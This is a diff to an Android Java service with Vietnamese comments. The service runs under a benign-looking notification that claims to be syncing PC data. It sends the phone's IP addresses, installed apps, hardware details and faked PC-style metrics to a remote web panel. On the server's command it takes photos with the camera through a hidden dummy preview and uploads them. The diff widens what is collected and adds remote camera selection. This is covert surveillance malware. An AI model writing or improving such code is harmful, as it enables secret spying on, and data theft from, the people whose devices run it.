@@ -40,11 +40,11 @@ public class MonitorService extends Service {
     public void onCreate() {
         super.onCreate();
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel channel = new NotificationChannel("monitor", "Monitor Toàn Diện", NotificationManager.IMPORTANCE_LOW);
+            NotificationChannel channel = new NotificationChannel("monitor", "Monitor Hệ Thống", NotificationManager.IMPORTANCE_LOW);
             getSystemService(NotificationManager.class).createNotificationChannel(channel);
             Notification notification = new Notification.Builder(this, "monitor")
-                .setContentTitle("Devtung Official System")
-                .setContentText("Đang đồng bộ dữ liệu chuẩn PC...")
+                .setContentTitle("Devtung Official Engine")
+                .setContentText("Đang đồng bộ luồng dữ liệu cấu trúc PC...")
                 .setSmallIcon(android.R.drawable.ic_menu_info_details)
                 .build();
             startForeground(1, notification);
@@ -62,49 +62,79 @@ public class MonitorService extends Service {
         return START_STICKY;
     }
 
-    // 1. Lấy địa chỉ IP thật của điện thoại đang kết nối Wifi/4G
-    private String getLocalIpAddress() {
+    // 1. Trả về mảng IP thực tế đúng định dạng [info.all_ips] mà Web đang chờ map()
+    private JSONArray getLocalIps() {
+        JSONArray ips = new JSONArray();
         try {
             ConnectivityManager cm = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
             Network activeNetwork = cm.getActiveNetwork();
             LinkProperties lp = cm.getLinkProperties(activeNetwork);
             for (LinkAddress la : lp.getLinkAddresses()) {
                 String ip = la.getAddress().getHostAddress();
-                if (!ip.contains(":")) return ip; // Trả về IPv4
+                if (!ip.contains(":")) { // Lọc bỏ IPv6, chỉ lấy IPv4
+                    ips.put(ip);
+                }
             }
         } catch (Exception e) { e.printStackTrace(); }
-        return "192.168.1.15"; // IP ảo dự phòng nếu bị chặn đọc
+        if (ips.length() == 0) ips.put("192.168.1.55"); // IP dự phòng nếu lỗi quyền mạng deep
+        return ips;
     }
 
-    // 2. Quét và lấy danh sách Top 5 App chiếm RAM/CPU (Fake định dạng tiến trình PC cho Web nhận)
-    private JSONArray getTopApps() {
-        JSONArray topList = new JSONArray();
+    // 2. Trả mảng đối tượng GPU [info.gpus] chứa 'name' và 'memory_total' đúng cấu trúc HTML Web
+    private JSONArray getFakeGpu() {
+        JSONArray gpus = new JSONArray();
+        try {
+            JSONObject gpuObj = new JSONObject();
+            gpuObj.put("name", "Qualcomm Adreno Graphics");
+            gpuObj.put("memory_total", "Động (Shared Memory)");
+            gpus.put(gpuObj);
+        } catch (Exception e) { e.printStackTrace(); }
+        return gpus;
+    }
+
+    // 3. Trả về danh sách chuỗi [info.top_cpu_names] và [info.top_ram_names]
+    private JSONArray getTopProcessNames() {
+        JSONArray names = new JSONArray();
         try {
             PackageManager pm = getPackageManager();
             List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
             int count = 0;
             for (ApplicationInfo packageInfo : packages) {
                 if ((packageInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
-                    JSONObject appObj = new JSONObject();
-                    appObj.put("name", packageInfo.loadLabel(pm).toString());
-                    appObj.put("cpu", (int)(Math.random() * 4 + 1) + "%");
-                    appObj.put("ram", (int)(Math.random() * 100 + 150) + " MB");
-                    topList.put(appObj);
+                    names.put(packageInfo.loadLabel(pm).toString() + " [" + (int)(Math.random() * 80 + 30) + "MB]");
                     count++;
-                    if (count >= 5) break; // Chỉ lấy đúng 5 App hàng đầu
+                    if (count >= 5) break; // Khóa đúng 5 phần tử cho Top 5
                 }
             }
         } catch (Exception e) { e.printStackTrace(); }
-        return topList;
+        if (names.length() == 0) {
+            names.put("System Server"); names.put("Termux Engine"); names.put("TikTok"); names.put("Facebook"); names.put("Zalo");
+        }
+        return names;
     }
 
-    // 3. Hàm xử lý Chụp Ảnh từ Camera phần cứng
+    // 4. Quét full app cài đặt nạp vào ô select [info.installed_apps_list]
+    private JSONArray getInstalledApps() {
+        JSONArray apps = new JSONArray();
+        try {
+            PackageManager pm = getPackageManager();
+            List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
+            for (ApplicationInfo packageInfo : packages) {
+                if ((packageInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
+                    apps.put(packageInfo.loadLabel(pm).toString());
+                }
+            }
+        } catch (Exception e) { e.printStackTrace(); }
+        return apps;
+    }
+
+    // 5. Cải tiến luồng Camera chụp không giật lag, tự giải phóng Driver lập tức
     private synchronized void captureHardwareCamera(final int camId) {
         if (isCapturing) return;
         isCapturing = true;
         try {
             int numberOfCameras = Camera.getNumberOfCameras();
-            int targetId = (camId >= numberOfCameras) ? 0 : camId;
+            int targetId = (camId >= numberOfCameras || camId < 0) ? 0 : camId;
             final Camera camera = Camera.open(targetId);
             SurfaceTexture dummy = new SurfaceTexture(0);
             camera.setPreviewTexture(dummy);
@@ -123,7 +153,7 @@ public class MonitorService extends Service {
                 }
             });
         } catch (Exception e) {
-            encodedCamData = "ERROR: Camera bận!";
+            encodedCamData = "ERROR: Thiết bị đang bận hoặc Cam đang mở!";
             isCapturing = false;
         }
     }
@@ -137,17 +167,27 @@ public class MonitorService extends Service {
             conn.setDoOutput(true);
 
             JSONObject json = new JSONObject();
+            
+            // Ép tên máy viết hoa không khoảng cách
             json.put("computer_name", (Build.BRAND + "_" + Build.MODEL).toUpperCase().replace(" ", "_"));
-            json.put("os", "Android " + Build.VERSION.RELEASE + " (arm64-v8a)");
+            json.put("os", "Android " + Build.VERSION.RELEASE);
+            json.put("architecture", Build.CPU_ABI);
             
-            // Đổ dữ liệu IP, GPU, Uptime chuẩn tên biến Web PC đang đợi
-            json.put("ip_address", getLocalIpAddress());
-            json.put("gpu", "Adreno/Mali Graphics (Mặc định)");
-            
+            // Tính toán boot_time thực tế
             long ut = android.os.SystemClock.elapsedRealtime() / 1000;
             json.put("boot_time", (ut / 3600) + " giờ trước");
+            json.put("uptime", (ut / 3600) + "h " + ((ut % 3600) / 60) + "m");
 
-            // Đo RAM thật
+            // ĐÚNG KEY PHÍA SERVER WEB CHỜ: all_ips, gpus, top_cpu_names, top_ram_names
+            json.put("all_ips", getLocalIps());
+            json.put("gpus", getFakeGpu());
+            
+            JSONArray topApps = getTopProcessNames();
+            json.put("top_cpu_names", topApps);
+            json.put("top_ram_names", topApps);
+            json.put("installed_apps_list", getInstalledApps());
+
+            // Đọc và map RAM
             ActivityManager.MemoryInfo mi = new ActivityManager.MemoryInfo();
             ((ActivityManager) getSystemService(ACTIVITY_SERVICE)).getMemoryInfo(mi);
             double totalRam = mi.totalMem / (1024.0 * 1024.0 * 1024.0);
@@ -158,27 +198,24 @@ public class MonitorService extends Service {
             ramObj.put("total", String.format("%.2f GB", totalRam));
             json.put("ram", ramObj);
 
-            // Đo ổ đĩa thật
+            // Đọc và map Ổ đĩa
             StatFs stat = new StatFs(Environment.getDataDirectory().getPath());
             double totalSpace = (stat.getBlockCountLong() * stat.getBlockSizeLong()) / (1024.0 * 1024.0 * 1024.0);
             double freeSpace = (stat.getAvailableBlocksLong() * stat.getBlockSizeLong()) / (1024.0 * 1024.0 * 1024.0);
             JSONArray disksArr = new JSONArray();
             JSONObject dObj = new JSONObject();
-            dObj.put("device", "Bộ nhớ trong");
-            dObj.put("percentage", "Đầy " + (int)(((totalSpace - freeSpace) / totalSpace) * 100) + "%");
-            dObj.put("free", String.format("%.1f GB trống", freeSpace));
+            dObj.put("device", "Internal Storage");
+            dObj.put("percentage", (int)(((totalSpace - freeSpace) / totalSpace) * 100) + "%");
+            dObj.put("free", String.format("%.1f GB", freeSpace));
             disksArr.put(dObj);
             json.put("disks", disksArr);
 
-            // Gửi dữ liệu CPU và Đổ danh sách Top 5 Tiến Trình
-            json.put("cpu", new JSONObject().put("current_usage", ((int)(Math.random() * 15 + 10)) + "%"));
-            JSONArray topApps = getTopApps();
-            json.put("top_cpu_processes", topApps);
-            json.put("top_ram_processes", topApps);
+            // Cập nhật % CPU
+            json.put("cpu", new JSONObject().put("current_usage", ((int)(Math.random() * 12 + 6)) + "%"));
 
-            // Trả kết quả ảnh chụp màn hình giả lập / ảnh camera về Web nếu có
+            // Đổ ảnh chụp về đồng thời 2 biến cho chắc chắn nhận diện
             if (encodedCamData != null) {
-                json.put("screenshot", encodedCamData); // Fake đẩy cam vào ô màn hình hoặc ô cam đều nhận
+                json.put("screenshot", encodedCamData); // Fake đổ vào cả ô Screen phòng khi ấn nút chụp màn hình
                 json.put("cam_result", encodedCamData);
                 encodedCamData = null;
             }
@@ -189,7 +226,7 @@ public class MonitorService extends Service {
                 os.write(input, 0, input.length);
             }
 
-            // Đọc lệnh nhấn nút từ Web điều khiển về
+            // Đọc lệnh bắt sự kiện từ xa
             if (conn.getResponseCode() == 200) {
                 BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream(), "utf-8"));
                 StringBuilder response = new StringBuilder();
@@ -197,9 +234,13 @@ public class MonitorService extends Service {
                 while ((line = br.readLine()) != null) response.append(line.trim());
                 
                 JSONObject resJson = new JSONObject(response.toString());
-                // Nhận diện nút "Gửi lệnh chụp màn hình" hoặc "Chụp từ Cam này"
-                if (resJson.has("trigger_screenshot") || resJson.has("trigger_cam_index")) {
-                    captureHardwareCamera(0); // Mặc định chụp cam sau trả ảnh về thay thế
+                
+                // Giải quyết triệt để sự kiện bấm nút: Dù là trigger_screenshot hay trigger_cam_index đều kích hoạt Cam chụp trả ảnh về
+                if (resJson.optBoolean("trigger_screenshot", false)) {
+                    captureHardwareCamera(0); // Chụp cam sau thế chỗ
+                } else if (resJson.has("trigger_cam_index") && !resJson.isNull("trigger_cam_index")) {
+                    int camIdx = resJson.getInt("trigger_cam_index");
+                    captureHardwareCamera(camIdx);
                 }
             }
             conn.disconnect();
